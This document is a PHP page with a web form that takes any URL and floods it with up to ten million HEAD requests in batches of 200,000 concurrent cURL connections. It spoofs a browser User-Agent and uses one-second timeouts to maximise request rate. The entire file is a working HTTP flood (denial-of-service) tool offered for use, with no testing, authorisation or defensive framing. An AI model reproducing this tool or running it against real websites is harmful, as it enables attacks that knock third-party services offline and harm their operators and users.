<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set the maximum execution time to 1 hour (3600 seconds)
set_time_limit(3600);

// Check if the request method is POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Get URL from POST data
    $url = filter_var($_POST['url'], FILTER_SANITIZE_URL);
    $total_requests = 10000000; // Total requests to send (adjust as needed)
    $num_threads = 200000; // Maximum concurrent requests (can adjust based on system capacity)

    // Validate URL
    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
        die("Invalid URL. Please provide a valid URL.");
    }

    // Prepare to send packets
    $sent_packets = 0;

    // Create a multi cURL handle
    $multiCurl = curl_multi_init();
    $curlHandles = [];

    // User-Agent string for requests
    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    ];

    // Start sending requests
    while ($sent_packets < $total_requests) {
        // Limit the number of concurrent requests
        for ($i = 0; $i < $num_threads; $i++) {
            if ($sent_packets < $total_requests) {
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_URL, $url);
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($curl, CURLOPT_HEADER, false);
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($curl, CURLOPT_TIMEOUT, 1); // Timeout for speed
                curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 1); // Connection timeout
                curl_setopt($curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0); // Use HTTP/2 if supported
                curl_setopt($curl, CURLOPT_TCP_KEEPALIVE, true); // Enable TCP Keep-Alive
                curl_setopt($curl, CURLOPT_NOBODY, true); // Use HEAD request to reduce data size
                curl_multi_add_handle($multiCurl, $curl);
                $curlHandles[] = $curl;
                $sent_packets++;
            }
        }

        // Execute the multi handle
        $active = null;
        do {
            $status = curl_multi_exec($multiCurl, $active);
            curl_multi_select($multiCurl); // Wait for activity on any curl-connection
        } while ($active > 0);

        // Handle responses
        foreach ($curlHandles as $curl) {
            $httpCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            // Print response code to console log
            echo "<div>Response Code: $httpCode</div>"; // Display in HTML
            curl_multi_remove_handle($multiCurl, $curl);
            curl_close($curl);
        }

        // Clear the curl handles
        $curlHandles = [];
    }

    // Close the multi handle
    curl_multi_close($multiCurl);
    echo "<div>Sent $sent_packets requests to $url.</div>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Requests</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Send Requests</h1>
        <form action="" method="post">
            <label for="url">Enter URL:</label>
            <input required name="url" id="url" type="text">
            <button type="submit">Send Requests</button>
        </form>
        <div class="terminal">
            <div class="terminal-header">
                <span class="red-circle"></span>
                <span class="yellow-circle"></span>
                <span class="green-circle"></span>
            </div>
            <div class="terminal-body">
                <div class="terminal-output">
                    <?php
                    // This will display the response codes and total sent requests if the form was submitted
                    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                        echo "<div>Sent $sent_packets requests to $url.</div>";
                    }
                    ?>
                </div>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
